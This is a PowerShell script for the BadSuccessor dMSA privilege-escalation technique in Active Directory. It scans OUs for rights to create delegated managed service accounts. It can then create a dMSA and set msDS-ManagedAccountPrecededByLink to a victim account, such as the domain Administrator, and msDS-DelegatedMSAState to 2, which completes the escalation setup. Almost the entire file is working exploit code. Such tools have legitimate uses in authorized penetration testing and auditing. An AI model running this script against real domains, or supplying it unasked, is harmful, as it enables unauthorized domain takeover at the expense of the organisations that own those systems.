<#
.SYNOPSIS
    Checks for BadSuccessor (dMSA) privilege escalation vulnerability and can exploit it by creating a dMSA and setting attributes.

.DESCRIPTION
    - Finds OUs where you can create msDS-ManagedServiceAccount objects.
    - Optionally, creates a dMSA in a specified OU and sets the two attributes for exploitation.

.PARAMETER Domain
    The domain to query (optional; defaults to current domain).

.PARAMETER CreateDMSA
    Switch to trigger exploitation (create dMSA).

.PARAMETER OU
    DistinguishedName of the OU to create the dMSA in.

.PARAMETER DMSAName
    Name for the new dMSA account.

.PARAMETER VictimDN
    DN of the victim account to link (e.g., Domain Admin DN).

.EXAMPLE
    .\zBadSuccessor.ps1
    .\zBadSuccessor.ps1 -CreateDMSA -OU "OU=temp,DC=contoso,DC=com" -DMSAName "BadSuccessorTest" -VictimDN "CN=Administrator,CN=Users,DC=contoso,DC=com"
#>

param(
    [string]$Domain = $null,
    [switch]$CreateDMSA,
    [string]$OU,
    [string]$DMSAName,
    [string]$VictimDN
)

Import-Module ActiveDirectory

function Find-VulnerableOUs {
    Write-Host "`n[+] Searching for OUs with 'Create msDS-ManagedServiceAccount' rights..." -ForegroundColor Cyan
    $searchBase = if ($Domain) { (Get-ADDomain -Server $Domain).DistinguishedName } else { (Get-ADDomain).DistinguishedName }
    $ous = Get-ADOrganizationalUnit -SearchBase $searchBase -Filter *
    foreach ($ou in $ous) {
        $acl = Get-Acl "AD:$($ou.DistinguishedName)"
        foreach ($ace in $acl.Access) {
            if ($ace.ObjectType -eq "bf967a86-0de6-11d0-a285-00aa003049e2" -and $ace.ActiveDirectoryRights -match "CreateChild") {
                $identity = $ace.IdentityReference
                Write-Host "OU: $($ou.DistinguishedName) - $identity can create dMSA accounts!" -ForegroundColor Yellow
            }
        }
    }
    Write-Host "`n[+] Scan complete. Review results above." -ForegroundColor Green
}

function Invoke-CreateBadSuccessorDMSA {
    param(
        [Parameter(Mandatory=$true)]
        [string]$OU,
        [Parameter(Mandatory=$true)]
        [string]$DMSAName,
        [Parameter(Mandatory=$true)]
        [string]$VictimDN
    )

    Write-Host "[*] Creating dMSA account '$DMSAName' in OU: $OU" -ForegroundColor Cyan
    try {
        New-ADServiceAccount -Name $DMSAName -Path $OU -Enabled $true -ErrorAction Stop
    } catch {
        Write-Host "[!] Failed to create dMSA: $_" -ForegroundColor Red
        return
    }

    Write-Host "[*] Setting msDS-ManagedAccountPrecededByLink to $VictimDN" -ForegroundColor Cyan
    Set-ADServiceAccount -Identity $DMSAName -Add @{ 'msDS-ManagedAccountPrecededByLink' = $VictimDN }

    Write-Host "[*] Setting msDS-DelegatedMSAState to 2" -ForegroundColor Cyan
    Set-ADServiceAccount -Identity $DMSAName -Replace @{ 'msDS-DelegatedMSAState' = 2 }

    Write-Host "[+] dMSA account created and attributes set!" -ForegroundColor Green
}

# Main logic
Find-VulnerableOUs

if ($CreateDMSA) {
    if (-not ($OU -and $DMSAName -and $VictimDN)) {
        Write-Host "[!] --OU, --DMSAName and --VictimDN must be specified with -CreateDMSA" -ForegroundColor Red
        exit 1
    }
    Invoke-CreateBadSuccessorDMSA -OU $OU -DMSAName $DMSAName -VictimDN $VictimDN
}
